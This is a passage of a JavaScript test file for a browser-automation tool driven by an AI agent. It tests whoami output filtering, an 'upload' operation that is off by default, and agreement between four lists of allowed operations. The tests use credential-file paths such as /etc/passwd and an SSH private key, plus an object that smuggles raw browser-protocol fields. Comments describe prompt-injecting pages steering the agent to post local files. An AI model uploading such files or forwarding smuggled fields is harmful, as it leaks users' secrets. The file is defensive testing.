  assert.ok(!/deadbeef/.test(JSON.stringify(s)), "the git HEAD must never reach the model");
  // Pre-existing whitelist guarantees still hold (LAN IPs / port / rate-limit config).
  const flat = JSON.stringify(s);
  assert.ok(!/192\.168\.50\.250/.test(flat), "host IPs must not leak");
  assert.ok(!/rate_limit|per_sec|burst/.test(flat), "rate-limit config must not leak");
});

test("summarizeResult: whoami tolerates a bare-string server_version (no git object)", () => {
  const s = JSON.parse(summarizeResult("whoami",
    { host: { label: "h" }, bridge: { server_version: "1.2.3" }, instances: [] },
    baseEnv()));
  assert.equal(s.bridge.server_version, "1.2.3");
});

test("runBrowserOp: the whoami narrowing applies on the LIVE path (env is threaded)", async () => {
  const impl = async () => ({ status: 200,
    async text() { return JSON.stringify(MULTI_WHOAMI); } });
  const out = await run({ op: "whoami" }, baseEnv({ BROWSER_AGENT_INSTANCE: "work" }), impl);
  const parsed = JSON.parse(out);
  assert.equal(parsed.instances.length, 1, "runBrowserOp must pass env to the summarizer");
  assert.ok(!/chase\.com|deadbeef/.test(out));
});

test("runBrowserOp: whoami surfaces a bridge non-200 (auth/host) as an error", async () => {
  const impl = async () => ({ status: 401,
    async text() { return JSON.stringify({ ok: false, error: "unauthorized" }); } });
  await assert.rejects(() => run({ op: "whoami" }, baseEnv(), impl),
    /HTTP 401/);
});

// --------------------------------------------------------------------------- //
// upload op via the TYPED tool (Gap 1): forced own-tab, required typed fields,
// ANY path allowed (the explicit exfil tradeoff — audit-logged server-side), and
// NO raw-CDP passthrough. `upload` populates an <input type=file> with a local
// file whose path Chrome reads itself (no bytes route through the agent).
//
// ⚠ BEHAVIOUR CHANGE: `upload` is no longer in ALLOWED_OPS_DEFAULT, so every test
// below that exercises the upload MECHANICS must first opt in via the documented
// `BROWSER_AGENT_ALLOWED_OPS` override (`uploadEnv`). The default-refusal contract
// is covered separately in the "off by default" block that follows. The mechanics
// themselves are unchanged — only their reachability is.
// --------------------------------------------------------------------------- //
const uploadEnv = (extra = {}) => baseEnv({
  BROWSER_AGENT_ALLOWED_OPS: [...ALLOWED_OPS_DEFAULT, "upload"].join(","), ...extra });

test("buildRequest: upload forces the env tab + requires selector & path; forwards --frame", () => {
  const b = buildRequest({ op: "upload", selector: "#f", path: "/home/zach/x.png" },
    uploadEnv(), TOK).body;
  assert.equal(b.op, "upload");
  assert.equal(b.tab, 4242, "upload is forced to the env tab (own-tab-scoped)");
  assert.equal(b.selector, "#f");
  assert.equal(b.path, "/home/zach/x.png");
  const f = buildRequest({ op: "upload", selector: "#f", path: "/p", frame: "bench" },
    uploadEnv(), TOK).body;
  assert.equal(f.frame, "bench", "upload forwards --frame (route into a cross-origin OOPIF)");
});

test("buildRequest: upload requires BOTH selector and path", () => {
  assert.throws(() => buildRequest({ op: "upload", path: "/p" }, uploadEnv(), TOK),
    /upload_missing_selector/);
  assert.throws(() => buildRequest({ op: "upload", selector: "#f" }, uploadEnv(), TOK),
    /upload_missing_path/);
});

test("buildRequest: upload allows ANY path (explicit exfil tradeoff — no path allowlist)", () => {
  for (const p of ["/etc/passwd", "/home/zach/.ssh/id_ed25519", "/tmp/x"]) {
    const b = buildRequest({ op: "upload", selector: "#f", path: p }, uploadEnv(), TOK).body;
    assert.equal(b.path, p, "any path is forwarded (accepted tradeoff; the server audit-logs it)");
  }
});

test("NO raw-CDP passthrough: upload forwards ONLY op/tab/selector/path/frame", () => {
  const hostile = { op: "upload", selector: "#f", path: "/p", frame: "x",
    cdp: "Page.setDownloadBehavior", method: "DOM.setFileInputFiles",
    params: { files: ["/etc/shadow"] }, objectId: "OBJ", files: ["/evil"],
    tab: 999, tabId: 999, target: "other-profile" };
  const b = buildRequest(hostile, uploadEnv(), TOK).body;
  assert.deepEqual(Object.keys(b).sort(), ["frame", "op", "path", "selector", "tab"],
    "only the typed upload fields reach the wire");
  assert.equal(b.tab, 4242, "the forced env tab wins over a smuggled tab");
  for (const leak of ["cdp", "method", "params", "objectId", "files", "target", "tabId"]) {
    assert.ok(!(leak in b), `${leak} must never be forwarded`);
  }
});

test("summarizeResult: upload returns basenames only (never the full path)", () => {
  const s = JSON.parse(summarizeResult("upload", { data: {
    selector: "#f", files: ["render.png"], frame: null, url: "https://x.test/" } }));
  assert.deepEqual(s, { ok: true, selector: "#f", files: ["render.png"], frame: null });
  assert.ok(!/\/home|\/etc|\/tmp/.test(JSON.stringify(s)),
    "a full path must never reach the model context");
});

test("runBrowserOp: upload reaches the bridge with the forced tab + typed fields", async () => {
  const fx = fetchStub({ upload: { ok: true, selector: "#f", files: ["x.png"],
    frame: null, url: "https://x.test/" } });
  const out = JSON.parse(await run(
    { op: "upload", selector: "#f", path: "/home/zach/x.png" }, uploadEnv(), fx));
  assert.equal(fx.calls.length, 1);
  assert.equal(fx.calls[0].body.op, "upload");
  assert.equal(fx.calls[0].body.tab, 4242, "forced env tab");
  assert.equal(fx.calls[0].body.path, "/home/zach/x.png");
  assert.equal(out.ok, true);
  assert.deepEqual(out.files, ["x.png"]);
});

test("runBrowserOp: upload is MUTATING → dry-run intercepts it (never populates a file input)", async () => {
  const fx = fetchStub();
  const out = await run({ op: "upload", selector: "#f", path: "/p" },
    uploadEnv({ BROWSER_AGENT_DRY_RUN: "1" }), fx);
  assert.match(out, /"dryRun":true/);
  assert.equal(fx.calls.length, 0, "a dry-run must never touch the bridge");
});

test("runBrowserOp: upload is refused when NOT in the op allowlist", async () => {
  const fx = fetchStub();
  await assert.rejects(run({ op: "upload", selector: "#f", path: "/p" },
    baseEnv({ BROWSER_AGENT_ALLOWED_OPS: "text,html" }), fx), /op_not_allowed:upload/);
  assert.equal(fx.calls.length, 0);
});

// --------------------------------------------------------------------------- //
// `upload` is OFF BY DEFAULT for the autonomous agent.
//
// The operator driving the `browser` CLI keeps `upload` (deliberate, audit-logged,
// human-chosen path). The cheap model does NOT: it is by design pointed at
// untrusted, prompt-injecting pages, and `upload` takes a caller-chosen ABSOLUTE
// path with no allowlist, so a hostile page could effectively choose which local
// file's contents get posted to it. Enforcement must live HERE (the tool), never
// in opencode's schema validation — whether an out-of-enum `op` is rejected before
// `execute()` is an unpinned opencode implementation detail.
// --------------------------------------------------------------------------- //
test("SECURITY: a model-issued upload is REFUSED by default (no env opt-in)", async () => {
  const fx = fetchStub();
  // The DEFAULT env — exactly what the wrapper sets — must refuse upload outright.
  await assert.rejects(run({ op: "upload", selector: "#f", path: "/home/zach/.ssh/id_ed25519" },
    baseEnv(), fx), /op_not_allowed:upload/);
  assert.equal(fx.calls.length, 0, "a default-env upload must never reach the bridge");
  // …and at the buildRequest layer too (no fetch involved at all).
  assert.throws(() => buildRequest({ op: "upload", selector: "#f", path: "/etc/passwd" },
    baseEnv(), TOK), /op_not_allowed:upload/);
  // A dry-run must not be a bypass either.
  await assert.rejects(run({ op: "upload", selector: "#f", path: "/etc/passwd" },
    baseEnv({ BROWSER_AGENT_DRY_RUN: "1" }), fx), /op_not_allowed:upload/);
  assert.equal(fx.calls.length, 0);
});

test("BROWSER_AGENT_ALLOWED_OPS can explicitly re-enable upload (documented override)", async () => {
  assert.ok(!allowedOpsFromEnv(baseEnv()).includes("upload"),
    "default resolution excludes upload");
  assert.ok(allowedOpsFromEnv(baseEnv({ BROWSER_AGENT_ALLOWED_OPS: "text,upload" }))
    .includes("upload"), "an explicit override re-enables it");
  const fx = fetchStub({ upload: { selector: "#f", files: ["x.png"], frame: null } });
  const out = JSON.parse(await run({ op: "upload", selector: "#f", path: "/home/zach/x.png" },
    baseEnv({ BROWSER_AGENT_ALLOWED_OPS: "text,upload" }), fx));
  assert.equal(fx.calls.length, 1, "the opt-in reaches the bridge");
  assert.equal(fx.calls[0].body.op, "upload");
  assert.equal(fx.calls[0].body.path, "/home/zach/x.png");
  assert.equal(out.ok, true);
});

// --------------------------------------------------------------------------- //
// FOUR-SOURCE OP-SET PARITY (drift guard).
//
// The agent's op set is stated in four independent places; they silently drifted
// once (browser.js enum: 10 ops, ALLOWED_OPS_DEFAULT: 12 incl. `upload`, the
// agent-md table: 12 incl. `upload`, the README: 10) which left the model TOLD it
// had `upload` while the enforcement layer ALLOWED it and only an unpinned schema
// detail stood in between. Parse all four and assert they are identical.
// --------------------------------------------------------------------------- //
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";

const BB = dirname(dirname(fileURLToPath(import.meta.url))); // scripts/browser-bridge
const readBB = (...p) => readFileSync(join(BB, ...p), "utf8");

/** ops from browser.js's typed `op` enum (the schema the model is bound by). */
function opsFromToolJs() {
  const src = readBB("opencode", "tools", "browser.js");
  const m = src.match(/\.enum\(\[([\s\S]*?)\]\)/);
  assert.ok(m, "browser.js must declare a `.enum([...])` op list");
  return [...m[1].matchAll(/"([a-z]+)"/g)].map((x) => x[1]);
}

/** ops from the agent-md capability table (what the MODEL is told it has). */
function opsFromAgentMd() {
  const src = readBB("opencode", "browser-agent.md");
  // Only the `| `browser(op="X"…` table rows — not prose mentions.
  return [...src.matchAll(/^\|\s*`browser\(op="([a-z]+)"/gm)].map((x) => x[1]);
}

/** ops from the README's published `op` ∈ {…} contract. */
function opsFromReadme() {
  const src = readBB("README.md");
  const m = src.match(/`op` ∈ \{([\s\S]*?)\}/);
  assert.ok(m, "README must publish an ``op` ∈ {…}` list for the agent");
  return [...m[1].matchAll(/`([a-z]+)`/g)].map((x) => x[1]);
}

test("OP-SET PARITY: browser.js enum == ALLOWED_OPS_DEFAULT == agent-md == README", () => {
  const sorted = (a) => [...a].sort();
  const impl = sorted(ALLOWED_OPS_DEFAULT);
  const js = sorted(opsFromToolJs());
  const md = sorted(opsFromAgentMd());
  const readme = sorted(opsFromReadme());
  assert.ok(impl.length >= 10, "sanity: the parsed default op set is non-trivial");
  assert.deepEqual(js, impl, "browser.js `op` enum must match ALLOWED_OPS_DEFAULT");
  assert.deepEqual(md, impl, "the agent-md capability table must match ALLOWED_OPS_DEFAULT");
  assert.deepEqual(readme, impl, "the README op list must match ALLOWED_OPS_DEFAULT");
});

test("OP-SET PARITY: `upload` appears in NONE of the four agent-facing sources", () => {
  assert.ok(!ALLOWED_OPS_DEFAULT.includes("upload"), "ALLOWED_OPS_DEFAULT");
  assert.ok(!opsFromToolJs().includes("upload"), "browser.js typed op enum");
  assert.ok(!opsFromAgentMd().includes("upload"), "agent-md capability table");
  assert.ok(!opsFromReadme().includes("upload"), "README op list");
});

test("BROWSER_AGENT_ALLOWED_OPS is DOCUMENTED (it was read by code and documented nowhere)", () => {
  assert.match(readBB("README.md"), /BROWSER_AGENT_ALLOWED_OPS/,
    "the README must document the op-set override env var");
});
